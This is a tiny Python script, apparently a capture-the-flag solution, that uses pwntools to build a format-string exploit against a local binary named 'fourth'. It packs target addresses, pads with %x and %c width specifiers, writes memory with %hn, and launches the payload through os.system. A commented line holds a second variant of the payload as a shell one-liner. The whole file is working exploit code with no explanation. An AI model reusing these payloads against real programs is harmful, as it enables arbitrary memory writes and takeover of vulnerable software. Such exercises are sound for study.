from pwn  import *
import os
import sys

path = "./fourth "+p32(0x0804a024)+p32(0x0804a024)+"%x"*3+"%56988c"+"%hn"+"%c"+"%hn"
#./fourth `python -c'print "\x26\xa0\x04\x08"+"a"*4+"\x24\xa0\x04\x08"+"%x"*5+"%48854c"+"%hn"+"%73662c"+"%hn"'`

os.system(path)


